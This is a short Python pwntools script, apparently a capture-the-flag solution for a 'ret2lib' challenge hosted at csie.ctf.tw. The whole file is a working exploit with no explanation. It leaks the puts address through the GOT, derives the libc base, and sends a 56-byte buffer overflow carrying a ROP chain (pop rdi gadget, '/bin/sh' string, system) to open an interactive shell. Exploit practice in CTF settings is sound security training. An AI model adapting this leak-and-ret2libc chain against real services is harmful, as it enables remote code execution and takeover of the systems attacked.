from pwn import *
puts_off = 0x000000006f690
r = remote('csie.ctf.tw',10127)
#r = remote('127.0.0.1',8888)

r.send('601018\n')  #puts offset in GOT of ret2lib
s = r.recvline()    #remove first line
s = r.recvline()    #contain the addr of puts function
puts_addr = int(s.replace('address(hex):content:','').strip() , 16)

base = puts_addr - puts_off #get global base
print '[%s]' % hex(base)

gad_addr = p64(0x0000000400823) #pop rdi;ret
sh_addr = p64(base + 0x18cd17)  #string '/bin/sh' in libc.so.6
sys_addr = p64(base + 0x00000000045390) #system function addr in libc.so.6


r.send('A'*56 + gad_addr + sh_addr + sys_addr + '\n')

r.interactive()


